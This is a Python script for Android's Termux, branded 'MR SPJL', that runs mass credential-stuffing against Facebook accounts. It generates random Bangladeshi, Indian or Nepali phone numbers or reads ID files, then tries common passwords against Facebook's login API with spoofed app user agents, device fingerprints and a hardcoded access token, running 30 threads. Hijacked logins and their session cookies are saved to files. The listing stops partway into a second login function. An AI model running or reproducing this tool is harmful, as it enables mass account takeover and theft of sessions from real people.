#__________________| IMPORT |__________________#
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
from time import localtime as lt
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"
if not 'print' in open(first+'sessions.py','r').read():
    pass
else:
    exit('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR GF...')
def clear():
        os.system('clear')
os.system('clear')
print('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE...!\x1b[38;5;244m [\x1b[38;5;46m–\x1b[38;5;244m]\x1b[1;97m')
time.sleep(3)
os.system('clear')

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python run.py')
except:pass
#__________________[ date ]__________________#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];plist = []
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; (☠️)MR🛠️SPJL💚🥀(☠️)\x07')
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
#__________________[ M1 ]__________________#
def HOP_M1():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/en_US;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        return ua
#__________________[ M2 ]__________________#
def HOP_M2():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
        return ua
#__________________[ M3 ]__________________#
def HOP_M3():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
#-----------------------[ UA-CODE ]-----------------------#
#old ua def[👇]
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])

#__________________| LOGO |__________________#
logo=(f"""

\033[1;33mMM    MM RRRRRR         SSSSS  PPPPPP      JJJ LL      
MMM  MMM RR   RR       SS      PP   PP     JJJ LL      
MM MM MM RRRRRR         SSSSS  PPPPPP      JJJ LL      
MM    MM RR  RR             SS PP      JJ  JJJ LL      
MM    MM RR   RR        SSSSS  PP       JJJJJ  LLLLLLL                                                        
\x1b[1;97m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐\033[1;37m
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m☠️\x1b[38;5;244m)\x1b[38;5;46m OWNER    \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mMR🛠️SPJL💚🥀\x1b[38;5;244m] \x1b[1;97m                ┃
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m☠️\x1b[38;5;244m)\x1b[38;5;46m VERSION  \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46m1.0.V\x1b[38;5;244m] \x1b[1;97m                      ┃
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m☠️\x1b[38;5;244m)\x1b[38;5;46m TOOLTYPE \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mFREE\x1b[38;5;244m]\x1b[1;97mx\x1b[38;5;244m[\x1b[38;5;46mFILE\x1b[1;97m┼\x1b[38;5;46mRANDOM\x1b[38;5;244m] \x1b[1;97m         ┃
\x1b[1;97m┃\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m┃
\x1b[1;97m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\033[1;37m""")

#__________________| MAIN |__________________#
def menu():
        try:
                        clear()
                        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m({A}0\x1b[38;5;244m)\x1b[38;5;46m EXIT TOOL')
                        linex()
                        xd=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : /sdcard/FILE.txt ');linex()
                                file = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)');linex()
                                mthd=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
                                try:
                                    clear()
                                    ps_limit = int(input(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m PASSWORD LIMIT : '))
                                except:
                                    ps_limit =1
                                clear()
                                print(f'\x1b[38;5;244m[\x1b[1;97m☠️\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
                                print(f'\x1b[38;5;244m[\x1b[1;97m☠️\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ');linex()
                                for i in range(ps_limit):
                                    plist.append(input(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m PASSWORD NO {i+1} \x1b[38;5;244m–\x1b[38;5;46m➤{A} '))
                                linex()
                                print(f'\x1b[38;5;244m[\x1b[1;97m☠️\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
                                print(f'\x1b[38;5;244m[\x1b[1;97m☠️\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ');linex()
                                clear()
                                print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT ➤ \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]')
                                linex()
                                cx=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m–\x1b[38;5;46m➤{A} '+total_ids+f' \x1b[38;5;244m({A}✘\x1b[38;5;244m)\x1b[38;5;46m PASS \x1b[38;5;244m–\x1b[38;5;46m➤{A} {ps_limit}')
                                        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
                                print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
                                print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
                                input(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                randm()
                        elif xd in ['3','03']:
                                _old_()
                        elif xd in ['0','05']:
                                exit(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m EXIT DONE ')
                        else:
                                exit(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m NO INTERNET CONNECTION...')
                exit()
#__________________| RANDOM |__________________#
def randm():
    clear()
    print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m BANGLADESH CLONING ')
    print(f'\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m INDIA CLONING ')
    print(f'\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m NEPAL CLONING ')
    print(f'\x1b[38;5;244m({A}0\x1b[38;5;244m)\x1b[38;5;46m BACK TO MENU ');linex()
    option=input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
        india()
    elif option in ['3','C']:
        nepal()
    elif option in ['0','00']:
        menu()
    else:
        exit(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m BYE BYE ')
#__________________| BANGLADESH |__________________#
def bd():
        user=[]
        clear()
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 017 | 019 | 018 | 016 ');linex()
        code = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
        clear();print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
        limit = int(input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '))
        clear()
        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\x1b[38;5;46m \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\x1b[38;5;46m ');linex()
        mthd = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
        for nmbr in range(limit):
            nmp=''.join(random.choice(string.digits) for _ in range(8))
            user.append(nmp)
        with tred(max_workers=30) as habib:    
            clear()
            tl = str(len(user))
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ')
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ')
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]');linex()
            for psx in user:
                uid = code+psx
                passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                if mthd in ['1','01']:
                    habib.submit(rndm1,uid,passlist)
                if mthd in ['2','02']:
                    habib.submit(rndm2,uid,passlist)
        print('\033[1;37m')
        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
        input(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
        menu()
#__________________| INDIA |__________________#
def india():
        user=[]
        clear()
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : +91639 | +91934 | +91902 | +91937 ');linex()
        code = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
        clear();print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
        limit = int(input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '))
        clear()
        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\x1b[38;5;46m \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\x1b[38;5;46m ');linex()
        mthd = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
        for nmbr in range(limit):
            nmp = "". join(random.choice(string.digits) for _ in range(7))
            user.append(nmp)
        with tred(max_workers=30) as habib:    
            clear()
            tl = str(len(user))
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ')
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ')
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]');linex()
            for psx in user:
                uid = code+psx
                passlist = [psx,uid[:8],'57273200','59039200','57575751']
                if mthd in ['1','01']:
                    habib.submit(rndm1,uid,passlist)
                if mthd in ['2','02']:
                    habib.submit(rndm2,uid,passlist)
        print('\033[1;37m')
        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
        input(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
        menu()
#__________________| NEPAL |__________________#
def nepal():
        user=[]
        clear()
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
        code = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
        clear();print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
        limit = int(input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '))
        clear()
        print(f'\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\x1b[38;5;46m \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\x1b[38;5;46m ');linex()
        mthd = input(f'\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ')
        for nmbr in range(limit):
            nmp = "". join(random.choice(string.digits) for _ in range(6))
            user.append(nmp)
        with tred(max_workers=30) as habib:    
            clear()
            tl = str(len(user))
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ')
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ')
            print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]');linex()
            for psx in user:
                uid = code+psx
                passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
                if mthd in ['1','01']:
                    habib.submit(rndm1,uid,passlist)
                if mthd in ['2','02']:
                    habib.submit(rndm2,uid,passlist)
        print('\033[1;37m')
        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED')
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK ID : '+str(len(oks)))
        print(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m TOTAL CP ID : '+str(len(cps)))
        print(f'\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
        input(f'\x1b[38;5;244m({A}☠️\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ')
#__________________| FILE METHOD M1 |__________________#
def api1(ids,names,passlist):
        try:
                global oks,loop,sim_id,device
                sys.stdout.write(f'\r\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;46m %s \x1b[38;5;244m|\x1b[38;5;46m OK\x1b[38;5;244m|\x1b[38;5;46mCP\x1b[38;5;46m %s\x1b[38;5;244m|\x1b[38;5;46m%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/en_US;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'community_id':'',
                                "sim_country": "id",
                                'try_num':'1',
                                'family_device_id':family,
                                'sim_serials':sim_serials,
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'logged_out_id': str(uuid.uuid4()),
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'tier': 'regular',
                                'reg_instance': str(uuid.uuid4()),
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'locale':fblc,
                                'client_country_code':'',
                                'fb_api_req_friendly_name':'authenticate',
                                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                                'User-Agent': HOP_M1(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mMR🛠️SPJL💚🥀-OK\x1b[38;5;244m)\x1b[38;5;46m '+ids+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r\x1b[38;5;244m=(\x1b[38;5;46m💥\x1b[38;5;244m)={A} "+coki)
                                        linex()
                                        open('/sdcard/MR×SPJL-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}MR🛠️SPJL💚🥀-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR×SPJL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| FILE METHOD M2 |__________________#
def api2(ids,names,passlist):
        try:
                global oks,loop,sim_id
